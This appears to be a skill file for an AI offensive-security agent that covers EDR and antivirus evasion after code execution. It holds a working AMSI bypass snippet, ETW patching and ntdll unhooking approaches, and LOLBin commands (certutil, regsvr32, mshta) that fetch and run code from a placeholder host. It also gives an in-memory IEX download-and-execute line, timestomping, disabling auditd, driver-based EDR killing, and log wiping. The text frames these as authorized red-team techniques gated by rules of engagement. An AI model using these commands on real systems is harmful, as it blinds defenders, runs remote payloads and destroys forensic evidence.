---
name: Defense Evasion and EDR Bypass
description: Operate against EDR/AV/logging after landing code exec — AMSI/ETW patching, userland unhooking, payload obfuscation, LOLBins/signed-binary proxy exec, reflective/in-memory loading, parent-PID spoofing, timestomp, RoE-gated log clearing, and BYOVD/impair-defenses — to run tooling without tripping detection. MITRE ATT&CK TA0005.
tags: [defense-evasion, edr-bypass, amsi, etw, unhooking, lolbins, obfuscation, in-memory, byovd, opsec, post-exploitation]
recommended_tools: [execute_command, upload_file, download_file]
vuln_classes: []
domain: post-exploitation
phase: defense-evasion
---
# Defense Evasion and EDR Bypass

Goal: run your tooling on a host that has EDR/AV/logging without being blocked, quarantined, or
alerted. This is a *post-exploitation* skill — you already have code exec. Everything here is
noise-reduction or detection-avoidance, not a new access vector. Maps to MITRE ATT&CK TA0005.

**AUTHORIZATION LINE — read first.** Blinding, disabling, or clearing defenses (impair defenses,
log clearing, killing EDR, loading a vulnerable driver) is destructive and frequently OUT OF SCOPE.
Only perform these when the RoE explicitly permits, and *always* prefer evasion (slipping past a
running sensor) over destruction (turning it off). Every technique below must be SCOPE/RoE-gated.
For each destructive action, note the reversal and log what you changed so state is restorable at
debrief. Prefer techniques that are reversible or leave the sensor running.

## Decision order
1. **Fingerprint** the defenses (what's installed, what's watched) — pick a gap, don't fight the sensor.
2. **Evade in-memory** (AMSI/ETW patch in your own process, reflective load) — no disk, no service kills.
3. **Live off the land** (signed binaries, LOLBins) before dropping any tool.
4. **Obfuscate/encode** anything that must touch disk or the command line.
5. **Blend** (parent-PID spoof, timestomp) so what you do run looks native.
6. **Destroy** (impair defenses, BYOVD, clear logs) — LAST resort, RoE-gated, reversal noted.

## 1. Fingerprint the defenses first
Cheapest win is choosing a technique the sensor doesn't cover. Enumerate before you act.
```cmd
tasklist /svc | findstr /i "MsMpEng Sysmon CrowdStrike csfalcon SentinelOne cb cylance carbon Defender"
sc query type= service state= all | findstr /i "SERVICE_NAME"
:: Sysmon config / driver present?
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SysmonDrv" 2>nul
:: Defender posture + exclusions (exclusions = a place your tools won't be scanned)
powershell -ep bypass -c "Get-MpComputerStatus; Get-MpPreference | select Exclusion*"
```
```bash
# Linux: auditd/EDR/falco footprint
ps aux | grep -iE 'falcon|auditd|osquery|falco|wazuh'; auditctl -l 2>/dev/null; ls /etc/audit/rules.d/
```
**PROOF:** you can name the EDR/AV/logging product(s) present and at least one gap (no Sysmon, a
scan exclusion path, script-block logging off) you intend to use.

## 2. AMSI bypass (unblock in-memory script/execution)
AMSI is what makes PowerShell/.NET flag malicious content mid-run. Patch it *in your own process*
only — this is per-process and dies with the process (reversible, low blast radius).
```powershell
# Force an AMSI init error so the scanner is inert for THIS process (classic reflection technique)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Alternative: patch AmsiScanBuffer in memory (works cross-language for the current process)
# — use a maintained loader; hardcoded byte-patch offsets are signatured and version-fragile.
```
Prefer obfuscated/updated one-liners — the plaintext bypass above is heavily signatured. Test with
a benign trigger (`'AmsiUtils'` string) before running real tooling.
**PROOF:** a string/command AMSI previously blocked now runs in the same session with no detection.

## 3. ETW patching (blind .NET/telemetry providers)
ETW feeds much EDR .NET telemetry. Patch `EtwEventWrite`/`ntdll!EtwEventWrite` in your process to
starve those events. Per-process, dies with the process — but note it in the log as a reversal item.
```
# Via C2 (Cobalt/Sliver/Nighthawk) or an in-proc loader:
#   patch ntdll!EtwEventWrite prologue -> ret (0xC3) in current process only
# Do NOT disable the ETW session globally (logman stop) unless RoE allows — that is destructive/detectable.
```
**PROOF:** .NET-loader activity (e.g. `execute-assembly`) that previously alerted now runs quietly;
ETW-fed events for your process stop appearing.

## 4. Userland unhooking (defeat inline API hooks)
EDR inline-hooks ntdll to inspect syscalls. Restore a clean `ntdll` (fresh copy from disk/KnownDlls)
or use direct/indirect syscalls so your calls skip the hooked stubs. Prefer syscall-based tooling
over patching when possible.
```
# Options, in order of preference:
#   - Indirect syscalls (SysWhispers-style) — never touch the hooked userland stub
#   - Load a fresh \KnownDlls\ntdll.dll and remap .text over the hooked one
#   - Full unhook (Perun's Fart / refresh from disk) — noisier, use maintained tooling
```
**PROOF:** a syscall/API call the EDR previously intercepted (e.g. remote-thread injection) completes
without generating the corresponding EDR telemetry/block.

## 5. Payload obfuscation & encoding (T1027)
For anything that must hit disk or the command line. Change the *bytes* AND the *behavior signature*.
```bash
# Command-line / script obfuscation (avoid plaintext IEX + download in one line):
powershell -enc <BASE64_UTF16LE>                       # encode the command, break AV string matches
# .NET payloads: obfuscate/pack (ConfuserEx, etc.); strip default Cobalt/Meterpreter signatures
# Shellcode: encrypt (AES/XOR) at rest, decrypt in memory only; avoid msfvenom default encoders (signatured)
# Recompile OSS offensive tooling from source with renamed symbols to shed static sigs (see HTB: patched pbox)
```
Living off multiply-encoded loot is common on real boxes — e.g. base64-decode a backup N times
(`for i in $(seq 1 13); do v=$(echo "$v"|base64 -d); done`). Reverse the same way for staging.
**PROOF:** the artifact writes to disk / runs without AV quarantine, and static YARA/AV scan of the
file returns clean.

## 6. LOLBins / living-off-the-land (T1218) — try before dropping tools
Use trusted, signed, pre-installed binaries so nothing new appears. Prefer these to custom droppers.
```cmd
:: Download via signed binary (fewer new-process/new-file alerts than a custom downloader):
certutil -urlcache -split -f http://<IP>/<FILE> C:\Windows\Temp\<FILE>
bitsadmin /transfer j http://<IP>/<FILE> C:\Windows\Temp\<FILE>
:: Signed-binary proxy execution — run YOUR code under a trusted parent:
regsvr32 /s /n /u /i:http://<IP>/<FILE>.sct scrobj.dll     :: remote scriptlet
mshta http://<IP>/<FILE>.hta                                :: HTA exec
rundll32 <FILE>.dll,<EXPORT>                                :: DLL export exec
:: Trusted developer utilities proxy exec (T1127): msbuild <FILE>.csproj, InstallUtil, msxsl
```
On Linux, "LOLBins" = GTFOBins primitives already on-box (`curl`, `python`, `awk`, `openssl`) rather
than a dropped implant. Check [lolbas-project.github.io] / [gtfobins.github.io] for the current
technique per binary. Signed proxy exec beats a raw payload because the parent is trusted.
**PROOF:** your code runs as a child of a signed system binary; no new unsigned executable was written
to disk (or it was written to an AV exclusion path you identified in step 1).

## 7. Reflective / in-memory execution (T1620)
Never touch disk. Load .NET assemblies, DLLs, or shellcode straight into memory — defeats file AV
and reduces artifacts.
```
# From a C2 (Cobalt/Sliver/Meterpreter):
execute-assembly <Rubeus.exe> <args>      # run a .NET tool reflectively, no drop
# PowerShell reflective load (after AMSI patch in step 2):
[Reflection.Assembly]::Load([Convert]::FromBase64String('<B64_ASSEMBLY>')); [NS.Class]::Main(@())
# In-memory download+exec (no file on disk):
IEX (New-Object Net.WebClient).DownloadString('http://<IP>/<SCRIPT>.ps1')
```
For hash/creds work prefer reflective loaders (in-memory Mimikatz/nanodump) over dropping the EXE.
Extracting NTLM from a memory `.dmp` offline (volatility) is the fully off-host variant.
**PROOF:** the tool executes and returns output with no corresponding file-write / no on-disk artifact
for the sensor to quarantine.

## 8. Parent-PID spoofing & process-tree blending (T1134.004 / T1036.009)
Make your process look like it was spawned by a legitimate parent, breaking tree-based detections
(e.g. `winword.exe -> powershell.exe` alerts).
```
# Spawn under a benign parent (explorer.exe / a real service host) via C2:
#   ppid <PID_of_explorer>; spawnto C:\Windows\System32\<benign>.exe; then run your job
# Also: run from an expected image name/path, and avoid office-app -> shell parentage.
```
Reversal: spoofed processes exit normally; no persistent change. Note the spawned PIDs.
**PROOF:** your tooling appears in the process tree under a plausible legitimate parent, not under
your shell/loader.

## 9. Timestomp & artifact hiding (T1070.006 / T1564)
Blend any file you must drop so it doesn't stand out in timeline/forensic review.
```powershell
# Match a dropped file's timestamps to a neighboring system file (reversible: record originals first):
$t=(Get-Item C:\Windows\System32\kernel32.dll).LastWriteTime
$f=Get-Item C:\Windows\Temp\<FILE>; $f.LastWriteTime=$t; $f.CreationTime=$t; $f.LastAccessTime=$t
```
```bash
touch -r /bin/ls /tmp/<FILE>          # linux: clone timestamps from a system binary
```
Other hides: NTFS Alternate Data Streams (`type payload > file:stream`), `attrib +h +s`, drop into
noisy dirs. **Record original timestamps/attrs before changing** so state is restorable.
**PROOF:** the dropped artifact's MACE times match a legitimate neighbor and it does not surface in a
"recently modified" sweep.

## 10. Sandbox / AV emulation evasion (T1497)
Get your payload past automated AV/sandbox detonation so it only detonates on the real target.
```
# Common guards baked into the loader (not run interactively):
#   - environment keying: decrypt payload only if hostname/domain/username matches target
#   - anti-emulation: check uptime, CPU count, sleep-skip detection, user-artifact presence
#   - delayed execution past the sandbox analysis window
```
Environment keying is the cleanest — the payload is inert (and un-analyzable) anywhere but the
intended host.
**PROOF:** the payload runs on the target but returns benign/nothing in an AV sandbox or on a scan VM.

## 11. Impair defenses — DESTRUCTIVE, RoE-GATED
Turning defenses OFF is loud, often out of scope, and must be reversible. Do NOT do this by default.
Only with explicit RoE approval; log every change and restore at debrief.
```powershell
# --- Requires explicit authorization. Record current state FIRST for reversal: ---
Get-MpPreference | select DisableRealtimeMonitoring,ExclusionPath   # capture before
# Reversible additive change (preferred over disabling): stage tools in an exclusion path,
# or add one temporary exclusion and REMOVE it after:
Add-MpPreference   -ExclusionPath 'C:\Windows\Temp\<DIR>'
Remove-MpPreference -ExclusionPath 'C:\Windows\Temp\<DIR>'          # reversal — do this after
```
```bash
# Linux (RoE-gated): pause auditd rules, then restore
auditctl -e 0        # disable auditing  (reversal: auditctl -e 1 and reload /etc/audit/rules.d)
```
Killing an EDR service/driver, unloading Sysmon (`sysmon -u`), or tampering with a protected process
are high-risk — capture proof-of-concept authorization first.
**PROOF:** the specific sensor is confirmed inactive for the scoped window; the reversal command is
staged and the original state is recorded.

## 12. BYOVD — LAST resort, HIGH RISK, RoE-GATED
Bring-Your-Own-Vulnerable-Driver loads a signed-but-vulnerable driver to kill EDR from the kernel.
Extremely destructive, easily bricks/BSODs, and almost always requires specific written approval.
```
# Only with explicit authorization + rollback plan:
#   sc create <svc> binPath= C:\Windows\Temp\<vuln>.sys type= kernel && sc start <svc>
#   -> use the driver's primitive to unload EDR callbacks
# Reversal: sc stop <svc> && sc delete <svc>; remove the .sys. Log the driver hash used.
```
Prefer *any* userland technique above over BYOVD. Note that Microsoft's vulnerable-driver blocklist
may block known-bad `.sys` outright.
**PROOF:** documented authorization on file; EDR kernel callbacks removed for the scoped window;
driver service cleaned up and hash logged.

## 13. Log clearing — DESTRUCTIVE, RoE-GATED, do LAST
Indicator removal (T1070). Almost never appropriate on an engagement — clearing logs is itself a
high-fidelity alert and destroys evidence the client needs. Only with explicit RoE sign-off.
```cmd
:: Requires authorization. Export logs BEFORE clearing so they can be restored/handed back:
wevtutil epl Security C:\evidence\Security.evtx & wevtutil cl Security   :: <- gated
```
```bash
# linux (gated): preserve then truncate — never blind-delete
cp /var/log/auth.log /root/auth.log.bak; : > /var/log/auth.log
# clear only your own history: history -c; unset HISTFILE   (session-scoped, low impact)
```
Session-scoped history clearing is generally fine; system/event-log wiping is not without sign-off.
**PROOF:** logs exported/preserved before any clear; only the RoE-approved scope was touched.

## OPSEC notes
- **Evasion > destruction.** A running sensor you slipped past leaves the client's telemetry intact;
  a disabled sensor is loud, forensically obvious, and usually out of scope.
- **In-process patches (AMSI/ETW) are the safest** — they die with the process, need no privilege
  escalation, and change nothing on disk. Reach for these before anything that touches a service.
- **Signed/LOLBin/in-memory first, custom dropper last.** Every new unsigned file on disk is a scan.
- **Signatures rot.** The public AMSI/ETW one-liners are all flagged; obfuscate or use maintained
  loaders, and test against a benign trigger before running real tooling.
- **Log what you blind.** For every destructive/reversible action, record original state + reversal
  command and include it in the debrief so the environment is restored.
- **Match the host.** Use system-native binaries, plausible parent processes, and neighbor-matched
  timestamps — blending beats brute-force disabling.
- **Verify quietly.** Confirm the bypass worked with a benign probe (AMSI test string, a single
  telemetry event) before launching noisy tooling into a sensor you assume is blind.
